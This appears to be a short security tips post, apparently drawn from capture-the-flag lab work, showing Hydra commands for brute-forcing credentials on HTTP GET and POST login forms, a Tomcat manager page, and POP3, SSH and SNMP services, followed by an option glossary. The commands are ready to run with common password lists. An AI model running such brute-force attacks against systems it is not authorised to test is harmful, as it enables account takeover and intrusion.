---
title: "Brute Force Login Page with Hydra"
date: 2026-01-13
tags: ['login-bruteforce', 'web-security', 'http', 'web-fuzzing', 'hydra-tool']
description: " "
cover:
  image: "/images/TipsAndTricks/Tips and Tricks.jpg"
  alt: "Tips & Tricks Cover"
  relative: true
---

Hydra is a powerful tool used for performing brute-force attacks on various services. In this tutorial, we'll explore brute-forcing login pages using different HTTP methods with Hydra.

#### Brute Force Login Page with HTTP GET Method:
```bash
hydra -C $PAYLOADS/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt $IP http-get  /manager/html -s 8080 
hydra -C $PAYLOADS/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://$IP:8080/manager/html
```
- Initiates the Hydra tool and specifies the target URL using the HTTP GET method.

#### Brute Force Login Page with HTTP POST Method:
```bash
hydra -l darren -P /usr/share/dict/rockyou.txt 10.10.69.229 http-post-form '/:user=^USER^&pass=^PASS^:F=Error: Invalid username or password' -s 8088
hydra -l '' -P 3_digit_pin.txt $IP http-form-post '/login.php:pin=^PASS^:F=Access denied' -s 8000 -v -f
```
- Initiates the Hydra tool and specifies the target URL using the HTTP POST method.

#### Brute Force Credentials of POP3 Protocol:
```bash
hydra -l doak -P /usr/share/dict/fasttrack.txt pop3://$IP -s 55007
```

#### Brute Force Credentials of SSH Protocol:
```bash
hydra -l meliodas -P /usr/share/dict/rockyou.txt ssh://$IP
```

#### Brute Force Credentials of SNMP Protocol:
```bash
hydra -P /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt snmp://10.10.152.137
```

### Hydra Options Explained:

- `-C <file>`: Specifies the path to the file containing a list of username and password combinations. 		i.e, admin:admin
- `-L <username file>`: Specifies the path to a file containing a list of usernames.
- `-l <username>`: Specifies a single username to use for the brute-force attack.
- `-P <password file>`: Specifies the path to a file containing a list of passwords.
- `-p <password>`: Specifies a single password to use for the brute-force attack.
- `-f / -F `: exit when a login/pass pair is found (-M: -f per host, -F global)
- `$IP`: Represents the IP address of the target.
- `-s <port>`: Specifies the target port.
- `http-get`: Initiates a brute-force attack using the HTTP GET method.
- `http-post-form`: Initiates a brute-force attack using the HTTP POST method with form parameters.
- `pop3://<IP>`: Specifies the POP3 protocol and target IP address.
- `ssh://<IP>`: Specifies the SSH protocol and target IP address.
- `snmp://<IP>`: Specifies the SNMP protocol and target IP address.
- Additional flags and options may be included for more detailed configuration and verbose output.